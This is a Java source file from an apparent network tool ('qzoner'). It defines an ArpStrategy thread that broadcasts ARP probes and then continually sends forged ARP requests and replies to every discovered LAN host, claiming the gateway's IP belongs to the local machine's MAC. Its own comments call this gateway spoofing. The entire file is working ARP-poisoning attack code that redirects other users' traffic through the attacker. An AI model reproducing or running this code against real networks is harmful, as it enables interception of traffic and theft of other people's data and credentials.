package org.jasic.qzoner.core;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import org.jasic.qzoner.common.GlobalCaches;
import org.jasic.qzoner.common.Globalvariables;
import org.jasic.qzoner.core.entity.IpMacPair;
import org.jasic.qzoner.util.PacketGener;
import org.jasic.utils.TimeUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.UnknownHostException;
import java.util.*;
import java.util.concurrent.LinkedBlockingQueue;

import static org.jasic.utils.StringUtils.fieldval2Map;
/**
 * User: Jasic
 * Date: 13-9-16
 */
@SuppressWarnings("unchecked")
public class ArpStrategy extends Thread {

    private static final Logger logger = LoggerFactory.getLogger(ArpStrategy.class);
    private static final String logHeader = "[Arp策略]-";

    private long interval;
    private IpMacPair localIpMacPair;
    private IpMacPair gateWay;

    private LinkedBlockingQueue<List<? extends Packet>> queue;//请求队列

    public ArpStrategy(IpMacPair ipMacPair, IpMacPair gateWay) {
        this.localIpMacPair = ipMacPair;
        this.gateWay = gateWay;
        this.interval = Globalvariables.ARP_STRATEGY_INTERVAL;
    }

    @Override
    public void run() {

        this.queue = GlobalCaches.IP_MAC_LAN_PACKET_TO_BE_SEND_QUEUE;
        Timer timer = new Timer(true);
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                // 1、arp广播请求
                try {
                    List bs = brocasStrategy();
                    logger.info(logHeader + bs.toString());
                    if (bs.size() == 0) {
                        logger.info(logHeader + "network configure error, generate none arp brocast packet~");
                        return;
                    }
                    queue.put(bs);
                } catch (Exception e) {
                    e.printStackTrace();
                    logger.info(logHeader + e.getMessage());
                }

            }
        }, 0, this.interval * 2);
        while (!isInterrupted()) {
            try {
                // 2、伪造网关请请
                List fqs = fakeReqStrategy();

                // 3、伪造网关响应
                List fps = fakeRepStrategy();

                if (fqs.size() != 0) {
                    queue.put(fqs);
                    logger.info(logHeader + "[伪造网关请求]" + fqs.toString());
                    TimeUtil.sleep(2);
                }
                if (fps.size() != 0) {
                    queue.put(fps);
                    logger.info(logHeader + "[伪造网关响应]" + fps.toString());
                }
                TimeUtil.sleep(this.interval);
            } catch (Exception e) {
                e.printStackTrace();
                logger.info(logHeader + e.getMessage());
            }
        }
    }

    /**
     * 广播策略请求
     */
    private List<ARPPacket> brocasStrategy() throws UnknownHostException, InterruptedException {
        List<ARPPacket> arpPackets = PacketGener.genBrocastArp(this.localIpMacPair, true);
        return arpPackets;
    }

    /**
     * 指定欺骗请求
     */
    private List<ARPPacket> fakeReqStrategy() throws InterruptedException, UnknownHostException {
        return fakeArpStrategy(true);
    }

    /**
     * 指定欺骗响应
     * 因为不使用广播欺骗能减少网络阻塞，和不发送给网关。
     */
    private List<ARPPacket> fakeRepStrategy() throws InterruptedException, UnknownHostException {
        return fakeArpStrategy(false);
    }

    /**
     * 伪造arp实体 true：arp请求实体 false:arp响应实体
     *
     * @param isArpRequest true:request false:reply
     * @return
     * @throws UnknownHostException
     */
    private List<ARPPacket> fakeArpStrategy(boolean isArpRequest) throws UnknownHostException {
        List<ARPPacket> arpPacketList = new ArrayList<ARPPacket>();
        Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);

        if (gateWay != null) {
            availIpMacs.remove(gateWay.getIp()); // 移除网关
        }
        if (gateWay == null || availIpMacs.size() == 0) {
            logger.info(logHeader + "GateWay[" + fieldval2Map(gateWay) + "]" + ",from cache has none connectivity machine ");
            return arpPacketList;
        }

        // 伪造网关ip-mac对
        IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());

        for (IpMacPair ipMacPair : availIpMacs.values()) {
            if (ipMacPair.getMac().equals(this.localIpMacPair.getMac())) continue;// 排除本机

            ARPPacket packet = null;
            if (isArpRequest) {
                packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
            } else {
                packet = PacketGener.getArpRepPacket(fakeIpMac, ipMacPair, true);
            }
            arpPacketList.add(packet);
        }
        return arpPacketList;
    }
}
